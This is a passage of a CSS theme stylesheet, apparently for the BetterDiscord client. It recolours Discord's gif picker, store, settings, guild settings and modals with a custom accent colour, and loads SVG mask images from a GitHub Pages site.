	background-color: rgb(var(--vaccentcolor));
}

#app-mount .searchSuggestion-2K8OBX:hover {					/* gifpicker			suggestions							*/
	border-color: rgb(var(--vaccentcolor));
	background-color: rgb(var(--vaccentcolor));
}
.result-3w1ZcL[style*="background-color"] {					/* gifpicker			result loading						*/
	background-color: rgb(var(--vaccentcolor)) !important;
}
.result-3w1ZcL[style*="background-color: rgb(146, 154, 250)"] {
	background: var(--vaccentcolor-hover) !important;
}
.result-3w1ZcL[style*="background-color: rgb(179, 174, 255)"] {
	background: var(--vaccentcolor-active) !important;
}
.theme-light .focused-1En8bG::after,						/* gifpicker			result hover						*/
.theme-light .result-3w1ZcL:hover::after {
	box-shadow: inset 0 0 0 2px rgb(var(--vaccentcolor)), inset 0 0 0 3px #dcddde;
}
.theme-dark .focused-1En8bG::after,							/* gifpicker			result hover						*/
.theme-dark .result-3w1ZcL:hover::after {
	box-shadow: inset 0 0 0 2px rgb(var(--vaccentcolor)), inset 0 0 0 3px #2f3136;
}
#app-mount .categoryFadeBlurple-1j72_A {					/* gifpicker			categoryfade						*/
	background-color: rgba(var(--vaccentcolor), 0.8);
}
#app-mount .categoryFadeBlurple-1j72_A:hover {
	background-color: rgba(var(--vaccentcolor), 0.95);
}
.introductionAction-M1r6AX {								/* gifpicker			introductionaction tooltip			*/
	color: rgb(var(--vaccentcolor));
}

/* ----		3.4.	MEMBERLIST						---- */

.premiumIcon-1rDbWQ {
	color: rgb(var(--vaccentcolor));
}

/* ----		3.5.	SEARCHPAGE						---- */

.noResultsImage-3Y0eCI.alt-3EpRdH {
	display: flex;
}
.noResultsImage-3Y0eCI.alt-3EpRdH::before {
	content: "";
	position: absolute;
	width: 160px;
	height: 160px;
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/searchpage_noresults_accent.svg) center/cover no-repeat;
}

/* ----		3.6.	CALL							---- */

.sparkleBlurple-awNnsZ {
	background-image: url(https://discordapp.com/assets/c7539bb38577495f5021c8ea455c7145.png);
}
.popBlurple-27zBE3 {
	background-image: url(https://discordapp.com/assets/237a2f9325a83d230fb30b2cd63bbfe6.png);
}
.lightBlurple-1mZKpk {
	background-image: url(https://discordapp.com/assets/1c20f6ecd2d83c1844a3fd6da306d239.png);
}
.crossBlurple--iGG5Y {
	background-image: url(https://discordapp.com/assets/c13a0b03a798023c27155fad5f0c7a61.png);
}


/* ~~~~		4.		PEOPLES							~~~~ */

.wrapper-1cBijl .btn:disabled {								/* addfriendpage		button								*/
	background-color: rgb(var(--vaccentcolor));
}


/* ~~~~		5.		STORE/NITRO						~~~~ */

#app-mount .premiumIndicator-1XvbfM {						/* premium				where?								*/
	background-color: rgb(var(--vaccentcolor));
}

.gridItemGuildSubscription-1sZ0fD::before {
	background: rgb(255, 255, 255) linear-gradient(135deg, rgb(162, 48, 194), rgba(162, 48, 194, 0.5));
}
.gridItemBadge-1Se-Pu::before {
	background: rgb(255, 255, 255) linear-gradient(135deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}

.activeTransferGuildCardBorder-2jUQ7t{
	background: rgb(255, 255, 255) linear-gradient(135deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}

.premiumGuildSubscriptionRowActive-1WxLXI{
	background: rgb(255, 255, 255) linear-gradient(135deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}

.theme-light .animationContainer-cNePAf {
	color: rgb(var(--vaccentcolor));
}
.theme-light .shine-KMI5j7 {
	color: rgba(var(--vaccentcolor), 0.2);
}

.grandfatheredMessage-1BnHtv {
	background: rgb(255, 255, 255) linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}
.tierGrandfathered-R6zrrD.banner-3Kac2g {
	background: rgb(255, 255, 255) linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5) 75.25%);
}

.tier1-UUxEBG,
.headerTier1-2Ckjmd,										/* submodal				tier1 header						*/
.tier1HeaderBackground-3LjWgU {								/* submodal				tier1 bg							*/
	background-color: rgb(var(--vaccentcolor));
}
.headerTier1-2Ckjmd .wrapper-1P_m9K image:not([width="170px"]),
.tier1HeaderBackground-3LjWgU .wrapper-1P_m9K image:not([width="170px"]) {
	display: none !important;
}
.tier1-1ttHRY.banner-3Kac2g {
	background: rgb(255, 255, 255) linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5) 75.25%);
}

.tier2-3pW_6T,
.headerTier2-3FKMxd,										/* submodal				tier2 header						*/
.tier2HeaderBackground-2BUqcl {								/* submodal				tier2 bg							*/
	background: #ffcd4b linear-gradient(45deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}
.tier2-3hSil0.banner-3Kac2g {
	background: #ffcd4b linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5) 75.25%);
}

.price-1rEl-z {												/* submodal				price								*/
	color: rgb(var(--vaccentcolor));
}

.iconBackgroundTier1-2GOcU8 {								/* tierlist				tier1 bg							*/
	background: rgb(255, 255, 255) linear-gradient(45deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}
.iconBackgroundTier2-2TeI3a {								/* tierlist				tier2 bg							*/
	background: #ffcd4b linear-gradient(45deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}

.xboxPromotion-1k0m0c {										/* bannerpromo			xboxpromo							*/
	background: #ffcd4b linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}
.bannerPromotionLogoPremium-2cB301 {						/* bannerpromo			logo								*/
	background: #ffcd4b linear-gradient(rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}
.premiumLogo-1D3iJc {										/* bannerpromo			nitro logo							*/
	background: rgb(255, 255, 255) linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}

#app-mount .tag-HanR-9 {									/* tag														*/
	background: rgb(255, 255, 255) linear-gradient(45deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}
#app-mount .tag-HanR-9::before {
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://discordapp.com/assets/04a2e1509ad72be575b1529b51ea3977.svg) top/cover no-repeat;
}

.skuButtonTier1-2XTq5D,
.skuButtonTier1-3-EFd9 {
	background: rgb(255, 255, 255) linear-gradient(32.3deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5) 75.25%);
}
.skuButtonTier2-2asv3-,
.skuButtonTier2-i01WfL {
	background: #ffcd4b linear-gradient(32.3deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}

#app-mount .alternativeSkuSelected-3Qhw9n {
	background-color: rgb(var(--vaccentcolor));
}

.overlappingBorder-1-XPGl {									/* store				preview image						*/
	border-color: rgb(var(--vaccentcolor));
}

#app-mount .headerFancy-1AcCLF {							/* store				header fancy						*/
	background: rgb(255, 255, 255) linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}
#app-mount .premiumHeaderPrice-1F1CMD {						/* store				price								*/
	background-color: rgb(var(--vaccentcolor));
}
.premiumCircle-3jgziV {										/* store				premiumcircle						*/
	background: rgb(255, 255, 255) linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}
#app-mount .staffIcon-2MB1se {								/* store				stafficon							*/
	background-color: rgb(var(--vaccentcolor));
}
#app-mount .nitroIcon-2uS3VJ {								/* store				nitroicon							*/
	background: rgb(255, 255, 255) linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}
.perkTag-2O4dx4 {											/* store				perktag								*/
	background: rgb(255, 255, 255) linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}
.confirmPremiumIcon-26GX5Y,									/* store				confirmpremiumicon					*/
.gameIcon-gg34Dz[style*="/assets/f6cbcdc9366fb8d31e03bdc6c9c50246.svg"] {
	background-color: rgb(255, 255, 255) !important;
	background-image: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/nitrobadge_details.svg), linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5)) !important;
}
.pageWrapper-3F6owx {										/* store				pagewrapper							*/
	background: white linear-gradient(114deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.6));
}


/* ~~~~		6.		LIBRARY							~~~~ */

.foreground-2aE44H {										/* installationpath		fill								*/
	stroke: rgb(var(--vaccentcolor));
}


/* ~~~~		7.		DISCOVERY						~~~~ */

.searchBox-3Y2Vi7:focus,									/* searchbox			focus								*/
.searchBox-3Y2Vi7:focus-within,
.searchPage-3GKAdT .search-1iTphC .searchBox-2_mAlO:focus,
.searchPage-3GKAdT .search-1iTphC .searchBox-2_mAlO:focus-within {
	border-color: rgb(var(--vaccentcolor));
}
.search-1iTphC .searchBox-2_mAlO:focus,
.search-1iTphC .searchBox-2_mAlO:focus-within {
	box-shadow: 0 0 0 1px rgb(var(--vaccentcolor)), 0 0 0 2px rgba(var(--vaccentcolor), 0.6), 0 0 0 3px rgba(var(--vaccentcolor), 0.3);
}

#app-mount .activeButton-1BJAiN,							/* pagination			button								*/
#app-mount .activeButton-1BJAiN:hover {
	background-color: rgb(var(--vaccentcolor));
}

															/* categorylist			selected item						*/
.categoryItem-3zFJns.selectedCategoryItem-3X8ujp .itemInner-3gVXMG {
	background-color: rgb(var(--vaccentcolor));
}

.categoryPill-34fszg.selected-1dONk0 {						/* categorylist			search categorypill					*/
	background-color: rgb(var(--vaccentcolor));
}


/* ~~~~		8.		USERSETTINGS					~~~~ */

.item-PXvHYJ[style^="color: rgb(114, 137, 218)"],
.item-PXvHYJ[style*=" color: rgb(114, 137, 218)"] {			/* settingsitems		list item							*/
	color: rgb(var(--vaccentcolor)) !important;
}
.item-PXvHYJ[style*="background-color: rgb(114, 137, 218)"] {
	background-color: rgb(var(--vaccentcolor)) !important;
}
.item-PXvHYJ[style*="background-color: rgba(114, 137, 218, 0.1)"] {
	background-color: rgb(var(--vaccentcolor), 0.1) !important;
}


.dot-2s_oHI {												/* settingsitems		dot									*/
	background-color: rgb(var(--vaccentcolor));
}

.cardBrand-39zmMQ {											/* settingsitems		card								*/
	background-color: rgb(var(--vaccentcolor));
}
.cardBrand-39zmMQ,
.cardBrandOutline-3jvFfo {
	border-color: rgb(var(--vaccentcolor));
}

.avatarUploaderInner-3UNxY3 {								/* accountsettings		avatar upload						*/
	background-color: rgb(var(--vaccentcolor));
}

#app-mount .questionMark-CWEQZn,							/* accountsettings		questionmark						*/
#app-mount .questionMark-3qBhGj {							/* accountsettings		questionmark new					*/
	background-color: rgb(var(--vaccentcolor));
}
#app-mount .questionMark-CWEQZn:hover,
#app-mount .questionMark-3qBhGj:hover {
	background: var(--vaccentcolor-hover);
}

.marketingLogoImage-2SzXIR {								/* boostsettings		boost header						*/
	position: relative;
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/guildsettings_boostheader_bg.svg) center/cover no-repeat;
}
.marketingLogoImage-2SzXIR::after {
	content: "";
	position: absolute;
	top: 0;
	right: 0;
	bottom: 0;
	left: 0;
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/guildsettings_boostheader_accent.svg) center/cover no-repeat;
}
#app-mount .tierUnlocked-27DwHo {							/* boostsettings		tierunlocked						*/
	color: rgb(var(--vaccentcolor));
}
#app-mount .tierAccomplished-2eXPdI,
#app-mount .tierCurrent-Lw7-4E,
#app-mount .tierDefault-2qaRkD {
	background: #ffcd4b linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}
#app-mount .tierCloseHint-380zIA {							/* boostsettings		tierclosehint						*/
	background-color: rgb(var(--vaccentcolor));
}
#app-mount .tierCloseHint-380zIA::before {
	border-right-color: rgb(var(--vaccentcolor));
}
#app-mount .tierHeaderUnlockedBackground-MW5XJU {			/* boostsettings		tierheaderunlockedbg				*/
	background: #ffcd4b linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}
.emojiIcon-2xOPMD {											/* boostsettings		perkicon emoji						*/
	color: rgb(var(--vaccentcolor));
	filter: brightness(75%);
}
.uploadSizeIcon-2HNa5p {									/* boostsettings		perkicon upload						*/
	color: rgb(var(--vaccentcolor));
}
.memberBadgeIcon-1hpSQc {									/* boostsettings		perkicon guild						*/
	color: rgb(var(--vaccentcolor));
	filter: brightness(150%);
}
.profileBadgeIcon-_ctnKj {
	position: relative;
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/usersettings_boostbadge_bg.svg) center/contain no-repeat;
}
.profileBadgeIcon-_ctnKj::after {
	content: "";
	position: absolute;
	top: 0;
	right: 0;
	bottom: 0;
	left: 0;
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/usersettings_boostbadge_accent.svg) center/contain no-repeat;
}
.premiumGuildIcon-13KUPa {									/* boostsettings		sub count icon						*/
	color: rgb(var(--vaccentcolor));
}
.gemWithLabel-2aecE_ {										/* boostsettings		progress label						*/
	color: rgb(var(--vaccentcolor));
}
.gemIndicatorProgressCircle-3wDFa1 {						/* boostsettings		progress circle						*/
	color: rgb(var(--vaccentcolor));
}
.guildSubscriberCountIcon-6Fo5EK {							/* boostsettings		sub count							*/
	color: rgb(var(--vaccentcolor));
}
.guildSubscriptionSlotIcon-EVE04u {							/* boostsettings		slot icon							*/
	color: rgb(var(--vaccentcolor));
}

.icon-3j1dJB {												/* hypesettings			perk icon							*/
	position: relative;
}
.icon-3j1dJB::after {
	content: "";
	position: absolute;
	top: 0;
	right: 0;
	bottom: 0;
	left: 0;
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/empty.svg) center/cover no-repeat;
}
.perkNewsletter-2lxlA1 {
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/usersettings_hypeperk1_bg.svg) center/cover no-repeat;
}
.perkNewsletter-2lxlA1::after {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/usersettings_hypeperk1_accent.svg) center/cover no-repeat;
}
.perkBadge-2la1kc {
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/usersettings_hypeperk2_bg.svg) center/cover no-repeat;
}
.perkBadge-2la1kc::after {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/usersettings_hypeperk2_accent.svg) center/cover no-repeat;
}
.perkChallenges-19qHzw {
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/usersettings_hypeperk3_bg.svg) center/cover no-repeat;
}
.perkChallenges-19qHzw::after {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/usersettings_hypeperk3_accent.svg) center/cover no-repeat;
}

.wrapper-3jrx9n {											/* overlaysettings		positionsettings wrapper			*/
	border-color: rgb(var(--vaccentcolor));
}
.option-n0icdO:hover {										/* overlaysettings		positionoption						*/
	background-color: rgb(var(--vaccentcolor));
}
.selected-mKYnfr.option-n0icdO {
	background-color: rgb(var(--vaccentcolor));
	border-color: rgb(var(--vaccentcolor));
}
															/* streamermodesettings	headerimage							*/
.noticeIcon-1phvR2[src="/assets/616e078b351d0df460971441949c53a3.svg"] {
	object-position: -999999px -999999px;
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/guildsettings_streamermode_bg.svg) center/contain no-repeat;
}
.noticeIcon-1phvR2[src="/assets/616e078b351d0df460971441949c53a3.svg"] + * {
	position: relative;
}
.noticeIcon-1phvR2[src="/assets/616e078b351d0df460971441949c53a3.svg"] + *::before,
.noticeIcon-1phvR2[src="/assets/616e078b351d0df460971441949c53a3.svg"] + *::after {
	content: "";
	position: absolute;
	top: 0;
	right: -204px;
	width: 184px;
	height: 110px;
}
.noticeIcon-1phvR2[src="/assets/616e078b351d0df460971441949c53a3.svg"] + *::before {
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/guildsettings_streamermode_accent.svg) center/contain no-repeat;
}
.noticeIcon-1phvR2[src="/assets/616e078b351d0df460971441949c53a3.svg"] + *::after {
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/guildsettings_streamermode_details.svg) center/contain no-repeat;
}


/* ~~~~		9.		GUILDSETTINGS					~~~~ */
															/* widgetsettings		widget placeholder image 			*/
.layer-3QrUeG[aria-label="GUILD_SETTINGS"] .contentRegion-3nDuYy .contentColumn-2hrIYH > div > div > .divider-3573oO + .flex-1xMQg5 + .divider-3573oO + .flex-1xMQg5:last-of-type {
	position: relative !important;
}
.layer-3QrUeG[aria-label="GUILD_SETTINGS"] .contentRegion-3nDuYy .contentColumn-2hrIYH > div > div > .divider-3573oO + .flex-1xMQg5 + .divider-3573oO + .flex-1xMQg5:last-of-type img[src="/assets/5fb477ca84edd15d9a2888ac28365acd.svg"] {
	object-position: -999999px -999999px;
	flex: unset !important;
	height: 310px !important;
	min-width: 320px !important;
	background: var(--background-tertiary);
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/guildsettings_widget_bg.svg) center/contain no-repeat;
}
.layer-3QrUeG[aria-label="GUILD_SETTINGS"] .contentRegion-3nDuYy .contentColumn-2hrIYH > div > div > .divider-3573oO + .flex-1xMQg5 + .divider-3573oO + .flex-1xMQg5:last-of-type::before,
.layer-3QrUeG[aria-label="GUILD_SETTINGS"] .contentRegion-3nDuYy .contentColumn-2hrIYH > div > div > .divider-3573oO + .flex-1xMQg5 + .divider-3573oO + .flex-1xMQg5:last-of-type::after {
	content: "";
	position: absolute;
	right: 0;
	bottom: 0;
	width: 320px;
	height: 310px;
}
.layer-3QrUeG[aria-label="GUILD_SETTINGS"] .contentRegion-3nDuYy .contentColumn-2hrIYH > div > div > .divider-3573oO + .flex-1xMQg5 + .divider-3573oO + .flex-1xMQg5:last-of-type::before {
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/guildsettings_widget_accent.svg) center/contain no-repeat;
}
.layer-3QrUeG[aria-label="GUILD_SETTINGS"] .contentRegion-3nDuYy .contentColumn-2hrIYH > div > div > .divider-3573oO + .flex-1xMQg5 + .divider-3573oO + .flex-1xMQg5:last-of-type::after {
	background: var(--header-primary);
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/guildsettings_widget_details.svg) center/contain no-repeat;
}

@-webkit-keyframes pulseBorder-1LZYy9 { 					/* intergrationsettings	new webhook							*/
	0% {border-color: transparent;}
	50% {border-color: rgb(var(--vaccentcolor));}
	to {border-color: transparent;}
}
@keyframes pulseBorder-1LZYy9 {
	0% {border-color: transparent;}
	50% {border-color: rgb(var(--vaccentcolor));}
	to {border-color: transparent;}
}


.placeholderImage-37MstR {									/* discoverysettings	insight								*/
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/guildsettings_insight_bg.svg) center/cover no-repeat;
}
.placeholderImage-37MstR::after {
	content: "";
	position: absolute;
	top: 0;
	right: 0;
	bottom: 0;
	left: 0;
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/guildsettings_insight_accent.svg) center/cover no-repeat;
}
															/* discoverysettings	partner program						*/
.banner-2AwsUs[src="/assets/b3d9ebeb2259945abe78c49206f5b62d.svg"] {
	object-position: -999999px -999999px;
	filter: grayscale(0.5);
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/guildsettings_partnerprogram_bg.svg) center/cover no-repeat;
}
.banner-2AwsUs[src="/assets/b3d9ebeb2259945abe78c49206f5b62d.svg"] + * {
	position: relative;
	display: flex;
	justify-content: center;
}
.banner-2AwsUs[src="/assets/b3d9ebeb2259945abe78c49206f5b62d.svg"] + *::after {
	content: "";
	position: absolute;
	top: -281px;
    width: 428px;
    height: 241px;
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/guildsettings_partnerprogram_accent.svg) center/cover no-repeat;
}

.defaultIcon-2NMkWn {										/* discoverysettings	default guildicon					*/
	background-color: rgb(var(--vaccentcolor));
}

															/* discoverysettings	requirements icon					*/
.requirementsImage-tqIP2X[src="/assets/ec3ea47d6b85de83ab2c298ddecf7df2.svg"],
.headerIcon-2S6VR5[src="/assets/8bfa6300dd6ce22829ffa093fb87da9f.svg"] {
	object-position: -999999999px -999999999px;
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/guildsettings_requirements_bg.svg) center/cover no-repeat;
}
.requirementsImage-tqIP2X[src="/assets/ec3ea47d6b85de83ab2c298ddecf7df2.svg"] + *,
.headerIcon-2S6VR5[src="/assets/8bfa6300dd6ce22829ffa093fb87da9f.svg"] + * {
	position: relative;
	height: 60px;
}
.requirementsImage-tqIP2X[src="/assets/ec3ea47d6b85de83ab2c298ddecf7df2.svg"] + *::after,
.headerIcon-2S6VR5[src="/assets/8bfa6300dd6ce22829ffa093fb87da9f.svg"] + *::after {
	content: "";
	position: absolute;
	left: -56px;
	bottom: 10px;
	width: 40px;
	height: 40px;
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/guildsettings_requirements_accent.svg) center/cover no-repeat;
}

.featureIcon-3p1TC_ [fill="#7289da" i] {					/* communitysettings	intro		featureicon				*/
	fill: rgb(var(--vaccentcolor));
}

.fakeButton-kGEmb3 {										/* communitysettings	rules		example fake			*/
	background-color: rgb(var(--vaccentcolor));
}

.exampleWumpus-3QIhvG .wumpus-3Q6pSF,						/* communitysettings	rules		wumpus					*/
.exampleWumpus-1zk2dq .wumpus-3JzuYd {						/* communitysettings	welcome		wumpus					*/
	object-position: -999999px -999999px;
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/guildsettings_wumpus_bg.svg) center/cover no-repeat;
}
.exampleWumpus-3QIhvG::after,
.exampleWumpus-1zk2dq::after {
	content: "";
	position: absolute;
	width: 82px;
	height: 72px;
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/guildsettings_wumpus_accent.svg) center/cover no-repeat;
}
.exampleModal-2oh58d .guildInfo-3Co_-d,						/* communitysettings	rules		wumpus icon				*/
.exampleModal-2X2Vf8 .guildIcon-1F8t_p + * {				/* communitysettings	rules		wumpus icon				*/
	position: relative;
}
.exampleModal-2X2Vf8 .guildIcon-1F8t_p + * {
	display: flex;
	justify-content: center;
	white-space: pre;
}
.exampleModal-2oh58d .guildIcon-38Zs0M,
.exampleModal-2X2Vf8 .guildIcon-1F8t_p {
	object-position: -999999px -999999px;
	border-radius: 10px;
	background: white url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/guildsettings_wumpusicon_bg.svg) center/cover no-repeat;
}
.exampleModal-2oh58d .guildInfo-3Co_-d::after {
	top: 0;
	width: 48px;
	height: 48px;
}
.exampleModal-2X2Vf8 .guildIcon-1F8t_p + *::after {
	top: -80px;
	width: 64px;
	height: 64px;
}
.exampleModal-2oh58d .guildInfo-3Co_-d::after,
.exampleModal-2X2Vf8 .guildIcon-1F8t_p + *::after {
	content: "";
	position: absolute;
	border-radius: 10px;
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/guildsettings_wumpusicon_accent.svg) center/cover no-repeat;
}


/* ~~~~		10.		MODALS							~~~~ */

/* ----		10.1.	USERMODAL						---- */

.topSectionPlaying-1J5E4n {									/* modal				topsection playing					*/
	background: rgb(var(--vaccentcolor));
}

.container-q03LZO.colored-1armap .profileBadgeBugHunterLevel1-dbEzVz {
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://discordapp.com/assets/df26f079738a4dcd07cbce6eb3c957f1.svg) center/contain no-repeat;
}
.container-q03LZO.colored-1armap .profileBadgeBugHunterLevel2-3TUciC {
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://discordapp.com/assets/16def052b03d75dac0ed9234c5d6a880.svg) center/contain no-repeat;
}
.container-q03LZO.colored-1armap .profileGuildSubscriberlvl1-3oI9tx {
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://discordapp.com/assets/24e49184598820f274e62293349a2e43.svg) center/contain no-repeat;
}
.container-q03LZO.colored-1armap .profileGuildSubscriberlvl2-r6nJHT {
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://discordapp.com/assets/cc73fba5c2e9b70752bbd1db35a1b9c3.svg) center/contain no-repeat;
}
.container-q03LZO.colored-1armap .profileGuildSubscriberlvl3-38s3Dj {
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://discordapp.com/assets/a4c3939a9b03274246df9b144fcd86cf.svg) center/contain no-repeat;
}
.container-q03LZO.colored-1armap .profileGuildSubscriberlvl4-2NXrsI {
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://discordapp.com/assets/d01bee8a9b41bd9dda26a43221b2e7e8.svg) center/contain no-repeat;
}
.container-q03LZO.colored-1armap .profileGuildSubscriberlvl5-3XIa2K {
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://discordapp.com/assets/a99def5f819c077e5e5061cab741b7e6.svg) center/contain no-repeat;
}
.container-q03LZO.colored-1armap .profileGuildSubscriberlvl6-3e3sxW {
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://discordapp.com/assets/2cfb317f3db3963d8ded9a97ee967bac.svg) center/contain no-repeat;
}
.container-q03LZO.colored-1armap .profileGuildSubscriberlvl7-1dVhQT {
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://discordapp.com/assets/278736f579d810b11ddf308cb598b19e.svg) center/contain no-repeat;
}
.container-q03LZO.colored-1armap .profileGuildSubscriberlvl8-1kXdFr {
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://discordapp.com/assets/38e40f25802a0fdf480d9b855a37a2f3.svg) center/contain no-repeat;
}
.container-q03LZO.colored-1armap .profileGuildSubscriberlvl9-1d6zav {
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://discordapp.com/assets/cfbc2d8ceacfacf07850f986c8165195.svg) center/contain no-repeat;
}

.guildAvatarWithoutIcon-1sTmE_ {							/* modal				shared servers no icon				*/
	background-color: rgb(var(--vaccentcolor));
}

/* ----		10.2.	GUILDADD/CREATION				---- */
															/* create guild			create own icon						*/
.icon-QM5383[src="/assets/79516499036b21acd5f56ccba0635c38.svg"] {
	object-position: -999999px -999999px;
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/guildcreate_createown_accent.svg) center/contain no-repeat;
}
.icon-QM5383[src="/assets/79516499036b21acd5f56ccba0635c38.svg"] + * {
	position: relative;
	display: flex;
	align-items: center;
	overflow: visible;
}
.icon-QM5383[src="/assets/79516499036b21acd5f56ccba0635c38.svg"] + *::after {
	content: "";
	position: absolute;
	left: -56px;
	width: 48px;
	height: 48px;
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/guildcreate_createown_bg.svg) center/contain no-repeat;
}

.uploadIcon-2IFzZU [fill="#7289da" i] {						/* create guild			upload icon							*/
	fill: rgb(var(--vaccentcolor));
}

/* ----		10.3.	REGIONSELECTMODAL				---- */

.regionSelectFlag-3uwFtG,									/* modal				regionselect flag					*/
.regionSelectFlag-1htPow {
	background-color: rgb(var(--vaccentcolor));
}
.vip-3pFIN8::after,											/* modal				regionselect vip					*/
.vip-1SuRbe::after {
	background: rgb(var(--vaccentcolor));
}
.regionSelect-3lf4eE button {								/* modal				regionselect button					*/
	color: rgb(var(--vaccentcolor));
}
#app-mount .regionSelect-3lf4eE:hover .regionSelectInner-24f4Ce,
#app-mount .regionSelect-3lf4eE:hover button {
	border-color: rgb(var(--vaccentcolor));
}
#app-mount .regionSelect-3lf4eE:hover button {
	background-color: rgb(var(--vaccentcolor));
}
.regionSelectModal-12e-57 .regionSelectModalHeader-21khC1 {	/* modal				regionselect header					*/
	color: rgb(var(--vaccentcolor));
}
															/* modal				regionselect option					*/
.regionSelectModal-12e-57 .regionSelectModalOption-2DSIZ3:hover {
	border-color: rgb(var(--vaccentcolor));
}
.check-2by_h9 {
	-webkit-mask: url(https://discordapp.com/assets/6acb20d5e709b34b6a7f36ec13648666.svg);
	background: rgb(var(--vaccentcolor));
}

/* ----		10.4.	UPLOADMODAL						---- */
															/* modal				background							*/
.uploadModalIn-1z07Bv .uploadDropModal-2kTwbc .bgScale-1otPtc {
	background-color: rgb(var(--vaccentcolor));
}

.attachment-33OFj0 .icon-1kp3fr,
.audioMetadata-3zOuGv::before,
.uploadModal-2ifh8j .icon-kyxXVr:not(.image-2yrs5j),
.uploadModalIn-1z07Bv .icon-kyxXVr:not(.image-2yrs5j) {
	object-position: -999999px -999999px;
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/files_bg.svg) center/contain no-repeat !important;
}
